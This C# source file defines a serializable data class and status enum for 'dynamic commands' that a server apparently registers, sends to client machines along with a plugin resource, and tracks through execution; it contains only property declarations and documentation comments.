using System;
using System.Collections.Generic;

namespace Orcus.Shared.DynamicCommands
{
    [Serializable]
    public class RegisteredDynamicCommand : DynamicCommandInfo
    {
        /// <summary>
        ///     A unique id for this command
        /// </summary>
        public int Id { get; set; }

        /// <summary>
        ///     The current status of the command
        /// </summary>
        public DynamicCommandStatus Status { get; set; }

        /// <summary>
        ///     Events sent by clients for this command
        /// </summary>
        public List<DynamicCommandEvent> DynamicCommandEvents { get; set; }

        /// <summary>
        ///     The resource id to request to download the needed plugin
        /// </summary>
        public int PluginResourceId { get; set; }

        /// <summary>
        ///     The date the command was added (UTC)
        /// </summary>
        public DateTime Timestamp { get; set; }

        /// <summary>
        ///     The ids of the clients which are currently executing the command
        /// </summary>
        public int[] ExecutingClientIds { get; set; }

        /// <summary>
        ///     The types needed for serialisation
        /// </summary>
        public new static Type[] RequiredTypes
        {
            get
            {
                var result = new List<Type>(DynamicCommandInfo.RequiredTypes) {typeof(RegisteredDynamicCommand)};
                return result.ToArray();
            }
        }
    }

    /// <summary>
    ///     The status of a <see cref="DynamicCommand" />
    /// </summary>
    public enum DynamicCommandStatus
    {
        /// <summary>
        ///     The command is waiting for the transmission event
        /// </summary>
        Pending,

        /// <summary>
        ///     The command is currently transmitting to clients
        /// </summary>
        Transmitting,

        /// <summary>
        ///     The command was sent to all targeted clients
        /// </summary>
        Done,

        /// <summary>
        ///     The command is currently executed by clients
        /// </summary>
        Active,

        /// <summary>
        ///     The command was manually stopped. That means that this command won't be executed any more
        /// </summary>
        Stopped
    }
}